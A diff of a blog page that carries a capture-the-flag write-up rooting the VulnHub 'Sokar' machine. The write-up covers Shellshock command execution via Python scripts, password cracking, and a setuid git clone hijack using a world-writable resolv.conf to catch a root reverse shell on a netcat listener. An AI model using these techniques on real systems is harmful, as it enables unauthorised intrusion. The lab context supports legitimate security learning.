 <p>Applying some more brain thingies to my current situation, I remembered the <a href=http://en.wikipedia.org/wiki/Shellshock_%28software_bug%29>Shellshock</a> bug disclosed in September 2014. The <code>/cgi-bin</code> path was the biggest hint towards it. I also remembered <a href=https://twitter.com/mubix>@mubix</a> was keeping a Github repository of <a href=https://github.com/mubix/shellshocker-pocs>PoC&rsquo;s for shellshock</a>, and promptly started to try a few against the CGI path.</p>
@@ -186,7 +208,7 @@ Content-Type: text/plain; charset<span style=color:#f92672>=</span>UTF-8
 
 uid<span style=color:#f92672>=</span>48<span style=color:#f92672>(</span>apache<span style=color:#f92672>)</span> gid<span style=color:#f92672>=</span>48<span style=color:#f92672>(</span>apache<span style=color:#f92672>)</span> groups<span style=color:#f92672>=</span>48<span style=color:#f92672>(</span>apache<span style=color:#f92672>)</span>
 </code></pre></div><p>Yay. I was now able to execute commands as <code>apache</code>. This allowed me to enumerate a great deal of the machine with relative ease.</p>
-<h2 id=making-life-easier>making life easier</h2>
+<h2 id=making-life-easier>making life easier<a hidden class=anchor aria-hidden=true href=#making-life-easier>#</a></h2>
 <p>Of course, constructing the curl request and header for every command that I wanted to run was starting to become boring really quickly. So, I slapped together some python that will accept an argument and execute the command (called <code>shock.py</code>):</p>
 <div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-python data-lang=python><span style=color:#75715e>#!/usr/bin/python</span>
 
@@ -283,7 +305,7 @@ uid<span style=color:#f92672>=</span>48<span style=color:#f92672>(</span>apache<
     do_command(command)
 
     print <span style=color:#e6db74>&#34; * Local &#39;</span><span style=color:#e6db74>%s</span><span style=color:#e6db74>&#39; transferred to remote &#39;</span><span style=color:#e6db74>%s</span><span style=color:#e6db74>&#39;&#34;</span> <span style=color:#f92672>%</span> (source, destination)
-</code></pre></div><h2 id=egress-firewalls-le-suck>egress firewalls le-suck</h2>
+</code></pre></div><h2 id=egress-firewalls-le-suck>egress firewalls le-suck<a hidden class=anchor aria-hidden=true href=#egress-firewalls-le-suck>#</a></h2>
 <p>With the file transfer script done, I coded up a small &lsquo;port scanner&rsquo; (though all it really does is try to connect to a port and move on to the next within 0.1s):</p>
 <div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-python data-lang=python><span style=color:#75715e>#!/usr/bin/python</span>
 
@@ -328,7 +350,7 @@ listening on eth1, link-type EN10MB <span style=color:#f92672>(</span>Ethernet<s
  * Executing /usr/bin/python /tmp/port_scan.py
 
 </code></pre></div><p>I waited&mldr; a really long time. I know poking at 65535 ports takes quite some time too so off I went to do other things. After quite some time, I returned to Sokar, to find that the <code>tcpdump</code> had no responses. I fiddled around with the scripts to check that I did not make a mistake but eventually I had to come to the conclusion that all outbound traffic is being filtered. Drat.</p>
-<h2 id=bynarr-the-fruit>bynarr the fruit</h2>
+<h2 id=bynarr-the-fruit>bynarr the fruit<a hidden class=anchor aria-hidden=true href=#bynarr-the-fruit>#</a></h2>
 <p>Not having an interactive shell was not the end of the world. Instead of fussing about that I decided to move on to poking around some more. Enumeration revealed that <code>/home/bynarr</code> was readable to me. In there was what looked like a kernel module <code>lime.ko</code> and a script called <code>lime</code> to <code>insmod</code> it. Both were owned by root:</p>
 <div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash>leonjza@kali/sokar $ python shock.py <span style=color:#e6db74>&#34;/bin/cat /home/bynarr/lime&#34;</span>
  * Executing /bin/cat /home/bynarr/lime
@@ -428,7 +450,7 @@ print requests<span style=color:#f92672>.</span>get(<span style=color:#e6db74>&#
 
 Password:
 uid<span style=color:#f92672>=</span>500<span style=color:#f92672>(</span>bynarr<span style=color:#f92672>)</span> gid<span style=color:#f92672>=</span>501<span style=color:#f92672>(</span>bynarr<span style=color:#f92672>)</span> groups<span style=color:#f92672>=</span>501<span style=color:#f92672>(</span>bynarr<span style=color:#f92672>)</span>,500<span style=color:#f92672>(</span>forensic<span style=color:#f92672>)</span>
-</code></pre></div><h2 id=the-scary-linux-memory-extractor>the scary linux memory extractor</h2>
+</code></pre></div><h2 id=the-scary-linux-memory-extractor>the scary linux memory extractor<a hidden class=anchor aria-hidden=true href=#the-scary-linux-memory-extractor>#</a></h2>
 <p>With command access as <code>bynarr</code> and remembering the mention of <code>tcp/51242</code> outbound connectivity, I once more try and run the port scanner that got copied to <code>/tmp</code>:</p>
 <div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash>leonjza@kali/sokar $ python bynarr.py <span style=color:#e6db74>&#34;/usr/bin/python /tmp/port_scan.py&#34;</span>
  * Executing /usr/bin/python -c <span style=color:#e6db74>&#34;import time; time.sleep(1); print &#39;fruity&#39;&#34;</span> | /usr/bin/python -c <span style=color:#e6db74>&#34;import pty; pty.spawn([&#39;/bin/su&#39;,&#39;-c&#39;,&#39;/usr/bin/python /tmp/port_scan.py&#39;, &#39;bynarr&#39;]);&#34;</span>
@@ -500,7 +522,7 @@ overdrive        <span style=color:#f92672>(</span>apophis<span style=color:#f92
 guesses: <span style=color:#ae81ff>1</span>  time: 0:00:01:51 DONE <span style=color:#f92672>(</span>Sat Jan <span style=color:#ae81ff>31</span> 20:35:42 2015<span style=color:#f92672>)</span>  c/s: <span style=color:#ae81ff>327</span>  trying: parati - nicole28
 Use the <span style=color:#e6db74>&#34;--show&#34;</span> option to display all of the cracked passwords reliably
 </code></pre></div><p><code>apophis:overdrive</code>.</p>
-<h2 id=build-the-clone-to-the-hook>build the clone to the hook</h2>
+<h2 id=build-the-clone-to-the-hook>build the clone to the hook<a hidden class=anchor aria-hidden=true href=#build-the-clone-to-the-hook>#</a></h2>
 <p>To get command execution as <code>apophis.py</code> I copied the <code>bynarr.py</code> script to make <code>apophis.py</code>, changing the username and the password.</p>
 <div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash>leonjza@kali/sokar $ python apophis.py <span style=color:#e6db74>&#34;id&#34;</span>
  * Executing /usr/bin/python -c <span style=color:#e6db74>&#34;import time; time.sleep(2); print &#39;overdrive&#39;&#34;</span> | /usr/bin/python -c <span style=color:#e6db74>&#34;import pty; pty.spawn([&#39;/bin/su&#39;, &#39;-l&#39;, &#39;-c&#39;,&#39;id&#39;, &#39;apophis&#39;]);&#34;</span>
@@ -541,7 +563,7 @@ Please make sure you have the correct access rights
 and the repository exists.
 Build? <span style=color:#f92672>(</span>Y/N<span style=color:#f92672>)</span>
 </code></pre></div><p>The same hostname resolution failure occurred. Hmm. Thinking about this, it looks like it is trying to clone a repository (as root??) to <code>/mnt/secret-project</code> from <code>sokar-dev</code> which does not resolve.</p>
-<h3 id=the-impossible-b0f>the impossible b0f</h3>
+<h3 id=the-impossible-b0f>the impossible b0f<a hidden class=anchor aria-hidden=true href=#the-impossible-b0f>#</a></h3>
 <p>I was very unsure about what the next move should be. Playing around some more with the binary, it appeared as though there may be a buffer overflow problem when providing a answer to <code>build.</code>:</p>
 <div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash>leonjza@kali/sokar $ ./build
 Build? <span style=color:#f92672>(</span>Y/N<span style=color:#f92672>)</span> YY
@@ -700,7 +722,7 @@ gdb-peda$ x/s $rdx
 0x7fffffffe7a0:  <span style=color:#e6db74>&#34;f&lt;:;f+ &#39;f. =i*%&amp;&#39;,i::!sff;&amp;&amp;=\t:&amp;\&#34;(;d-,?sf;&amp;&amp;=f:,*;,=d9;&amp;#,*=if</span>$<span style=color:#e6db74>&#39;=f:,*;,=d9;&amp;#,*=f&#34;</span>
 gdb-peda$
 </code></pre></div><p>Right before this call though, there is a instruction to <code>call 0x5555555547a0 &lt;setreuid@plt></code> to set the UID to 0. So, this brought me to the conclusion that <code>build</code> is running <code>/usr/bin/git clone ssh://root@sokar-dev:/root/secret-project /mnt/secret-project/</code> as <code>root</code>. But what is so special about this?</p>
-<h3 id=inspecting-git>inspecting git</h3>
+<h3 id=inspecting-git>inspecting git<a hidden class=anchor aria-hidden=true href=#inspecting-git>#</a></h3>
 <p>I did a lot of poking around here, wondering if I should pursue the avenue of trying to exploit the b0f which has the SSP, or should I try and figure out the significance of a <code>git clone</code> as root? One of my first theories was that if I could get <code>sokar-dev</code> to resolve to something I am in control of (like my Kali vm), I could attempt to have git clone a setuid shell. This was, of course, before I remembered that the only permissions <code>git</code> will honor really is the symlink and executable bits :(</p>
 <p>Further enumeration while I was thinking about the possibilities revealed that <code>/mnt/</code> was actually mounted with the <code>vfat</code> filesystem!</p>
 <div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash>leonjza@kali/sokar $ python apophis.py <span style=color:#e6db74>&#34;mount; cat /etc/fstab&#34;</span>
@@ -737,7 +759,7 @@ proc                    /proc                   proc    defaults        <span st
 Password:
 git version 2.2.0
 </code></pre></div><p>Great. <code>git</code> version 2.2.1 fixed this bug so we are in luck.</p>
-<h2 id=rooting-sokar>rooting sokar</h2>
+<h2 id=rooting-sokar>rooting sokar<a hidden class=anchor aria-hidden=true href=#rooting-sokar>#</a></h2>
 <p>All of this information was great to have, but it still had one major problem. How can I clone a repository <strong>I</strong> own? I made <em>countless</em> attempts to try fool the environment into resolving <code>sokar-dev</code> to my Kali Host. Every single one failed. All of the material on the topic that I found online suggest that the SUID process &lsquo;cleans up&rsquo; the environment, especially for reasons such as this one.</p>
 <p>I started doubting my plan and was nearing a point of leaving Sokar for a bit to rethink my strategy when I realized the following gem:</p>
 <div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash>leonjza@kali/sokar $ python apophis.py <span style=color:#e6db74>&#34;find /etc/ -writable -type f 2&gt;/dev/null | xargs ls -lh&#34;</span>
@@ -746,7 +768,7 @@ git version 2.2.0
 Password:
 -rw-rw-rw- <span style=color:#ae81ff>1</span> root root <span style=color:#ae81ff>19</span> Jan  <span style=color:#ae81ff>2</span> 20:12 /etc/resolv.conf
 </code></pre></div><p><code>/etc/resolv.conf</code> is <strong>world writable</strong>. This is perfect! I can change the DNS server to use to one that I control, obviously feeding it a IP that will be my local Kali instance :D</p>
-<h3 id=preparing-the-environment-and-exploit>preparing the environment and exploit</h3>
+<h3 id=preparing-the-environment-and-exploit>preparing the environment and exploit<a hidden class=anchor aria-hidden=true href=#preparing-the-environment-and-exploit>#</a></h3>
 <p>I decided to use <code>dnsmasq</code> for a quick to setup DNS server. I added a line to <code>/etc/dnsmasq.hosts</code> to answer a query for <code>sokar-dev</code>:</p>
 <div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash>leonjza@kali/sokar $ cat /etc/dnsmasq.hosts
 192.168.217.174 sokar-dev
@@ -873,7 +895,7 @@ remote: Total <span style=color:#ae81ff>5</span> <span style=color:#f92672>(</sp
 Checking connectivity... <span style=color:#66d9ef>done</span>.
 
 </code></pre></div><p>This shell just &lsquo;hung&rsquo; there, however, the netcat listener on my Mac had a different story to tell:</p>
-<pre><code>leonjza@laptop » sudo nc -lv 22
+<pre tabindex=0><code>leonjza@laptop » sudo nc -lv 22
 Password:
 [root@sokar secret-project]# cat /root/flag
 cat /root/flag
@@ -903,7 +925,7 @@ cat /root/flag
 |    rasta_mouse (@_RastaMouse)     |
 =====================================
 [root@sokar secret-project]#
-</code></pre><h2 id=conclusion>conclusion</h2>
+</code></pre><h2 id=conclusion>conclusion<a hidden class=anchor aria-hidden=true href=#conclusion>#</a></h2>
 <p>What a blast! Them feels of r00t are so <em>gooood</em>. For the curios, that firewall that was making life so difficult:</p>
 <div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash><span style=color:#f92672>[</span>root@sokar secret-project<span style=color:#f92672>]</span><span style=color:#75715e># cat /etc/sysconfig/iptables</span>
 cat /etc/sysconfig/iptables
@@ -925,7 +947,7 @@ cat /etc/sysconfig/iptables
 -A OUTPUT -m state --state NEW,ESTABLISHED -m owner --gid-owner <span style=color:#ae81ff>501</span> -p tcp --dport <span style=color:#ae81ff>51242</span> -j ACCEPT
 -A OUTPUT -j DROP
 COMMIT
-</code></pre></div><h2 id=edit>edit</h2>
+</code></pre></div><h2 id=edit>edit<a hidden class=anchor aria-hidden=true href=#edit>#</a></h2>
 <p>I have been wondering if it was possible to get complete remote root command execution using the sample python scripts used for apophis and bynarr. Well, turns out the <code>lime</code> script run with <code>sudo</code> can be shocked too!</p>
 <div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-python data-lang=python><span style=color:#75715e>#!/usr/bin/python</span>
 
@@ -958,36 +980,49 @@ print requests<span style=color:#f92672>.</span>get(<span style=color:#e6db74>&#
 </code></pre></div><p>Run with <code>python root.py "/bin/cat /root/flag"</code> :D</p>
 <p>Thanks to <a href=https://twitter.com/_RastaMouse>@_RastaMouse</a> for the VM, and as always, <a href=https://twitter.com/VulnHub>@VulnHub</a> for the hosting and great community!</p>
 </div>
-<div class=pagination>
-<div class=pagination__title>
-<span class=pagination__title-h>Read other posts</span>
-<hr>
-</div>
-<div class=pagination__buttons>
-<span class="button previous">
-<a href=https://leonjza.github.io/blog/2015/05/08/playing-exploit-exercises-nebula/>
-<span class=button__icon>←</span>
-<span class=button__text>playing exploit-exercises - nebula</span>
+<footer class=post-footer>
+<nav class=paginav>
+<a class=prev href=https://leonjza.github.io/blog/2015/05/08/playing-exploit-exercises-nebula/>
+<span class=title>« Prev Page</span>
+<br>
+<span>playing exploit-exercises - nebula</span>
 </a>
-</span>
-<span class="button next">
-<a href=https://leonjza.github.io/blog/2015/02/20/a-trivial-ios-jailbreak-detection-bypass/>
-<span class=button__text>a trivial iOS jailbreak detection bypass</span>
-<span class=button__icon>→</span>
+<a class=next href=https://leonjza.github.io/blog/2015/02/20/a-trivial-ios-jailbreak-detection-bypass/>
+<span class=title>Next Page »</span>
+<br>
+<span>a trivial iOS jailbreak detection bypass</span>
 </a>
-</span>
-</div>
-</div>
-</div>
-</div>
-<footer class=footer>
-<div class=footer__inner>
-<div class="copyright copyright--user"><a href=https://twitter.com/leonjza>@leonjza</a></div>
+</nav>
+<div class=share-buttons>
+<a target=_blank rel="noopener noreferrer" aria-label="share beating sokar the vulnhub turns 0b10 challenge on twitter" href="https://twitter.com/intent/tweet/?text=beating%20sokar%20the%20vulnhub%20turns%200b10%20challenge&url=https%3a%2f%2fleonjza.github.io%2fblog%2f2015%2f02%2f21%2fbeating-sokar-the-vulnhub-turns-0b10-challenge%2f&hashtags="><svg viewBox="0 0 512 512"><path d="M449.446.0C483.971.0 512 28.03 512 62.554v386.892C512 483.97 483.97 512 449.446 512H62.554c-34.524.0-62.554-28.03-62.554-62.554V62.554c0-34.524 28.029-62.554 62.554-62.554h386.892zM195.519 424.544c135.939.0 210.268-112.643 210.268-210.268.0-3.218.0-6.437-.153-9.502 14.406-10.421 26.973-23.448 36.935-38.314-13.18 5.824-27.433 9.809-42.452 11.648 15.326-9.196 26.973-23.602 32.49-40.92-14.252 8.429-30.038 14.56-46.896 17.931-13.487-14.406-32.644-23.295-53.946-23.295-40.767.0-73.87 33.104-73.87 73.87.0 5.824.613 11.494 1.992 16.858-61.456-3.065-115.862-32.49-152.337-77.241-6.284 10.881-9.962 23.601-9.962 37.088.0 25.594 13.027 48.276 32.95 61.456-12.107-.307-23.448-3.678-33.41-9.196v.92c0 35.862 25.441 65.594 59.311 72.49-6.13 1.686-12.72 2.606-19.464 2.606-4.751.0-9.348-.46-13.946-1.38 9.349 29.426 36.628 50.728 68.965 51.341-25.287 19.771-57.164 31.571-91.8 31.571-5.977.0-11.801-.306-17.625-1.073 32.337 21.15 71.264 33.41 112.95 33.41z"/></svg>
+</a>
+<a target=_blank rel="noopener noreferrer" aria-label="share beating sokar the vulnhub turns 0b10 challenge on linkedin" href="https://www.linkedin.com/shareArticle?mini=true&url=https%3a%2f%2fleonjza.github.io%2fblog%2f2015%2f02%2f21%2fbeating-sokar-the-vulnhub-turns-0b10-challenge%2f&title=beating%20sokar%20the%20vulnhub%20turns%200b10%20challenge&summary=beating%20sokar%20the%20vulnhub%20turns%200b10%20challenge&source=https%3a%2f%2fleonjza.github.io%2fblog%2f2015%2f02%2f21%2fbeating-sokar-the-vulnhub-turns-0b10-challenge%2f"><svg viewBox="0 0 512 512"><path d="M449.446.0C483.971.0 512 28.03 512 62.554v386.892C512 483.97 483.97 512 449.446 512H62.554c-34.524.0-62.554-28.03-62.554-62.554V62.554c0-34.524 28.029-62.554 62.554-62.554h386.892zM160.461 423.278V197.561h-75.04v225.717h75.04zm270.539.0V293.839c0-69.333-37.018-101.586-86.381-101.586-39.804.0-57.634 21.891-67.617 37.266v-31.958h-75.021c.995 21.181.0 225.717.0 225.717h75.02V297.222c0-6.748.486-13.492 2.474-18.315 5.414-13.475 17.767-27.434 38.494-27.434 27.135.0 38.007 20.707 38.007 51.037v120.768H431zM123.448 88.722C97.774 88.722 81 105.601 81 127.724c0 21.658 16.264 39.002 41.455 39.002h.484c26.165.0 42.452-17.344 42.452-39.002-.485-22.092-16.241-38.954-41.943-39.002z"/></svg>
+</a>
+<a target=_blank rel="noopener noreferrer" aria-label="share beating sokar the vulnhub turns 0b10 challenge on reddit" href="https://reddit.com/submit?url=https%3a%2f%2fleonjza.github.io%2fblog%2f2015%2f02%2f21%2fbeating-sokar-the-vulnhub-turns-0b10-challenge%2f&title=beating%20sokar%20the%20vulnhub%20turns%200b10%20challenge"><svg viewBox="0 0 512 512"><path d="M449.446.0C483.971.0 512 28.03 512 62.554v386.892C512 483.97 483.97 512 449.446 512H62.554c-34.524.0-62.554-28.03-62.554-62.554V62.554c0-34.524 28.029-62.554 62.554-62.554h386.892zM446 265.638c0-22.964-18.616-41.58-41.58-41.58-11.211.0-21.361 4.457-28.841 11.666-28.424-20.508-67.586-33.757-111.204-35.278l18.941-89.121 61.884 13.157c.756 15.734 13.642 28.29 29.56 28.29 16.407.0 29.706-13.299 29.706-29.701.0-16.403-13.299-29.702-29.706-29.702-11.666.0-21.657 6.792-26.515 16.578l-69.105-14.69c-1.922-.418-3.939-.042-5.585 1.036-1.658 1.073-2.811 2.761-3.224 4.686l-21.152 99.438c-44.258 1.228-84.046 14.494-112.837 35.232-7.468-7.164-17.589-11.591-28.757-11.591-22.965.0-41.585 18.616-41.585 41.58.0 16.896 10.095 31.41 24.568 37.918-.639 4.135-.99 8.328-.99 12.576.0 63.977 74.469 115.836 166.33 115.836s166.334-51.859 166.334-115.836c0-4.218-.347-8.387-.977-12.493 14.564-6.47 24.735-21.034 24.735-38.001zM326.526 373.831c-20.27 20.241-59.115 21.816-70.534 21.816-11.428.0-50.277-1.575-70.522-21.82-3.007-3.008-3.007-7.882.0-10.889 3.003-2.999 7.882-3.003 10.885.0 12.777 12.781 40.11 17.317 59.637 17.317 19.522.0 46.86-4.536 59.657-17.321 3.016-2.999 7.886-2.995 10.885.008 3.008 3.011 3.003 7.882-.008 10.889zm-5.23-48.781c-16.373.0-29.701-13.324-29.701-29.698.0-16.381 13.328-29.714 29.701-29.714 16.378.0 29.706 13.333 29.706 29.714.0 16.374-13.328 29.698-29.706 29.698zM160.91 295.348c0-16.381 13.328-29.71 29.714-29.71 16.369.0 29.689 13.329 29.689 29.71.0 16.373-13.32 29.693-29.689 29.693-16.386.0-29.714-13.32-29.714-29.693z"/></svg>
+</a>
+<a target=_blank rel="noopener noreferrer" aria-label="share beating sokar the vulnhub turns 0b10 challenge on facebook" href="https://facebook.com/sharer/sharer.php?u=https%3a%2f%2fleonjza.github.io%2fblog%2f2015%2f02%2f21%2fbeating-sokar-the-vulnhub-turns-0b10-challenge%2f"><svg viewBox="0 0 512 512"><path d="M449.446.0C483.971.0 512 28.03 512 62.554v386.892C512 483.97 483.97 512 449.446 512H342.978V319.085h66.6l12.672-82.621h-79.272v-53.617c0-22.603 11.073-44.636 46.58-44.636H425.6v-70.34s-32.71-5.582-63.982-5.582c-65.288.0-107.96 39.569-107.96 111.204v62.971h-72.573v82.621h72.573V512h-191.104c-34.524.0-62.554-28.03-62.554-62.554V62.554c0-34.524 28.029-62.554 62.554-62.554h386.892z"/></svg>
+</a>
+<a target=_blank rel="noopener noreferrer" aria-label="share beating sokar the vulnhub turns 0b10 challenge on whatsapp" href="https://api.whatsapp.com/send?text=beating%20sokar%20the%20vulnhub%20turns%200b10%20challenge%20-%20https%3a%2f%2fleonjza.github.io%2fblog%2f2015%2f02%2f21%2fbeating-sokar-the-vulnhub-turns-0b10-challenge%2f"><svg viewBox="0 0 512 512"><path d="M449.446.0C483.971.0 512 28.03 512 62.554v386.892C512 483.97 483.97 512 449.446 512H62.554c-34.524.0-62.554-28.03-62.554-62.554V62.554c0-34.524 28.029-62.554 62.554-62.554h386.892zm-58.673 127.703c-33.842-33.881-78.847-52.548-126.798-52.568-98.799.0-179.21 80.405-179.249 179.234-.013 31.593 8.241 62.428 23.927 89.612l-25.429 92.884 95.021-24.925c26.181 14.28 55.659 21.807 85.658 21.816h.074c98.789.0 179.206-80.413 179.247-179.243.018-47.895-18.61-92.93-52.451-126.81zM263.976 403.485h-.06c-26.734-.01-52.954-7.193-75.828-20.767l-5.441-3.229-56.386 14.792 15.05-54.977-3.542-5.637c-14.913-23.72-22.791-51.136-22.779-79.287.033-82.142 66.867-148.971 149.046-148.971 39.793.014 77.199 15.531 105.329 43.692 28.128 28.16 43.609 65.592 43.594 105.4-.034 82.149-66.866 148.983-148.983 148.984zm81.721-111.581c-4.479-2.242-26.499-13.075-30.604-14.571-4.105-1.495-7.091-2.241-10.077 2.241-2.986 4.483-11.569 14.572-14.182 17.562-2.612 2.988-5.225 3.364-9.703 1.12-4.479-2.241-18.91-6.97-36.017-22.23C231.8 264.15 222.81 249.484 220.198 245s-.279-6.908 1.963-9.14c2.016-2.007 4.48-5.232 6.719-7.847 2.24-2.615 2.986-4.484 4.479-7.472 1.493-2.99.747-5.604-.374-7.846-1.119-2.241-10.077-24.288-13.809-33.256-3.635-8.733-7.327-7.55-10.077-7.688-2.609-.13-5.598-.158-8.583-.158-2.986.0-7.839 1.121-11.944 5.604-4.105 4.484-15.675 15.32-15.675 37.364.0 22.046 16.048 43.342 18.287 46.332 2.24 2.99 31.582 48.227 76.511 67.627 10.685 4.615 19.028 7.371 25.533 9.434 10.728 3.41 20.492 2.929 28.209 1.775 8.605-1.285 26.499-10.833 30.231-21.295 3.732-10.464 3.732-19.431 2.612-21.298-1.119-1.869-4.105-2.99-8.583-5.232z"/></svg>
+</a>
+<a target=_blank rel="noopener noreferrer" aria-label="share beating sokar the vulnhub turns 0b10 challenge on telegram" href="https://telegram.me/share/url?text=beating%20sokar%20the%20vulnhub%20turns%200b10%20challenge&url=https%3a%2f%2fleonjza.github.io%2fblog%2f2015%2f02%2f21%2fbeating-sokar-the-vulnhub-turns-0b10-challenge%2f"><svg viewBox="2 2 28 28"><path d="M26.49 29.86H5.5a3.37 3.37.0 01-2.47-1 3.35 3.35.0 01-1-2.47V5.48A3.36 3.36.0 013 3 3.37 3.37.0 015.5 2h21A3.38 3.38.0 0129 3a3.36 3.36.0 011 2.46V26.37a3.35 3.35.0 01-1 2.47 3.38 3.38.0 01-2.51 1.02zm-5.38-6.71a.79.79.0 00.85-.66L24.73 9.24a.55.55.0 00-.18-.46.62.62.0 00-.41-.17q-.08.0-16.53 6.11a.59.59.0 00-.41.59.57.57.0 00.43.52l4 1.24 1.61 4.83a.62.62.0 00.63.43.56.56.0 00.4-.17L16.54 20l4.09 3A.9.9.0 0021.11 23.15zM13.8 20.71l-1.21-4q8.72-5.55 8.78-5.55c.15.0.23.0.23.16a.18.18.0 010 .06s-2.51 2.3-7.52 6.8z"/></svg>
+</a>
 </div>
 </footer>
-<script src=https://leonjza.github.io/assets/main.js></script>
-<script src=https://leonjza.github.io/assets/prism.js></script>
-</div>
-<script type=application/javascript>var doNotTrack=!1;doNotTrack||(function(a,e,f,g,b,c,d){a.GoogleAnalyticsObject=b,a[b]=a[b]||function(){(a[b].q=a[b].q||[]).push(arguments)},a[b].l=1*new Date,c=e.createElement(f),d=e.getElementsByTagName(f)[0],c.async=1,c.src=g,d.parentNode.insertBefore(c,d)}(window,document,'script','https://www.google-analytics.com/analytics.js','ga'),ga('create','UA-44457032-2','auto'),ga('send','pageview'))</script>
+</article>
+</main>
+<footer class=footer>
+<span>@leonjza</span>
+<span>
+Powered by
+<a href=https://gohugo.io/ rel="noopener noreferrer" target=_blank>Hugo</a> &
+        <a href=https://git.io/hugopapermod rel=noopener target=_blank>PaperMod</a>
+</span>
+</footer>
+<a href=#top aria-label="go to top" title="Go to Top (Alt + G)" class=top-link id=top-link accesskey=g><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 12 6" fill="currentcolor"><path d="M12 6H0l6-6z"/></svg>
+</a>
+<script>let menu=document.getElementById('menu');menu.scrollLeft=localStorage.getItem("menu-scroll-position"),menu.onscroll=function(){localStorage.setItem("menu-scroll-position",menu.scrollLeft)},document.querySelectorAll('a[href^="#"]').forEach(a=>{a.addEventListener("click",function(b){b.preventDefault();var a=this.getAttribute("href").substr(1);window.matchMedia('(prefers-reduced-motion: reduce)').matches?document.querySelector(`[id='${decodeURIComponent(a)}']`).scrollIntoView():document.querySelector(`[id='${decodeURIComponent(a)}']`).scrollIntoView({behavior:"smooth"}),a==="top"?history.replaceState(null,null," "):history.pushState(null,null,`#${a}`)})})</script>
+<script>var mybutton=document.getElementById("top-link");window.onscroll=function(){document.body.scrollTop>800||document.documentElement.scrollTop>800?(mybutton.style.visibility="visible",mybutton.style.opacity="1"):(mybutton.style.visibility="hidden",mybutton.style.opacity="0")}</script>
+<script>document.getElementById("theme-toggle").addEventListener("click",()=>{document.body.className.includes("dark")?(document.body.classList.remove('dark'),localStorage.setItem("pref-theme",'light')):(document.body.classList.add('dark'),localStorage.setItem("pref-theme",'dark'))})</script>
+<script>document.querySelectorAll('pre > code').forEach(b=>{const c=b.parentNode.parentNode,a=document.createElement('button');a.classList.add('copy-code'),a.innerText='copy';function d(){a.innerText='copied!',setTimeout(()=>{a.innerText='copy'},2e3)}a.addEventListener('click',e=>{if('clipboard'in navigator){navigator.clipboard.writeText(b.textContent),d();return}const a=document.createRange();a.selectNodeContents(b);const c=window.getSelection();c.removeAllRanges(),c.addRange(a);try{document.execCommand('copy'),d()}catch(a){}c.removeRange(a)}),c.classList.contains("highlight")?c.appendChild(a):c.parentNode.firstChild==c||(b.parentNode.parentNode.parentNode.parentNode.parentNode.nodeName=="TABLE"?b.parentNode.parentNode.parentNode.parentNode.parentNode.appendChild(a):b.parentNode.appendChild(a))})</script>
 </body>
 </html>
